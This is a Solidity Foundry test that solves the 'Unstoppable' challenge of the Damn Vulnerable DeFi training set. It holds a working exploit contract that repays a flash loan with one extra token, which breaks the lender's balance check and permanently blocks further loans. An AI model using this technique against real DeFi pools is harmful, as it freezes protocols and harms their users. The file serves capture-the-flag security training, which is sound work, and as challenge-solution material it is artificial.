// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Exploit {
    UnstoppableLender private immutable pool;
    error SenderMustBePool();

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        if (msg.sender != address(pool)) revert SenderMustBePool();
        IERC20(tokenAddress).transfer(msg.sender, amount + 1);
    }

    function executeFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }
}

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lender");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(1);
        vm.stopPrank();
        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        Exploit exploit = new Exploit(address(unstoppableLender));
        dvt.transfer(address(exploit), 1);
        exploit.executeFlashLoan(10);
        vm.stopPrank();
        /** EXPLOIT END **/
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
